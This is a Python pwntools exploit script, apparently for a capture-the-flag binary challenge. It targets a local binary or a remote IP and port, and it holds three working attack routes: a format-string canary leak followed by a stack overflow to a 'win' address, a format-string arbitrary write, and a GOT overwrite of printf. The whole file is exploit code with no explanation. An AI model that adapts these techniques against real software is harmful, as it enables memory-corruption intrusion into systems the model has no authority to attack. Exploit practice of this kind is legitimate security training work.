#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.arch = 'amd64'
debug = True
if debug:
    conn = process('./a.out')
else:
    conn = remote('220.249.52.133', 39751)

elf = ELF('./a.out')

win = 0x4008DA
log.success("win addr is {}\n".format(hex(win)))

offset = 6
log.success("offset is {}\n".format(offset))

conn.sendlineafter('3. Exit the battle \n', '2')

# Stack overflow, bypassing the canary
def func1():
    conn.sendline("%23$p")
    canary = int(conn.recvuntil('\n'), 16)
    log.success('canary is {:x}'.format(canary))
    conn.recvuntil('Exit the battle \n')
    conn.sendline('1')
    payload = 'A' * 0x88 + p64(canary) + 'AAAAAAAA' + p64(win)
    conn.sendline(payload)
    return conn.recvall()

# Format string, read and write anywhere
def func2():
    conn.sendline("%1$p")
    buf_addr = int(conn.recvuntil('\n'), 16)
    conn.sendlineafter('3. Exit the battle \n', '2')
    payload = fmtstr_payload(6, {buf_addr+0x98 : win})
    conn.sendline(payload)
    return conn.recvall()
# Overwrite the got table
def func3():
    log.success("got.printf is {:#x}".format(elf.symbols['got.printf']))
    payload = fmtstr_payload(6, {elf.symbols['got.printf']: win})
    conn.sendline(payload)
    conn.recvuntil('Exit the battle \n')
    conn.sendline('2')
    conn.sendline('2')
    return conn.recv()

recv = func1()
log.success("recv is {}".format(recv))
conn.sendlineafter('Exit the battle \n', '3')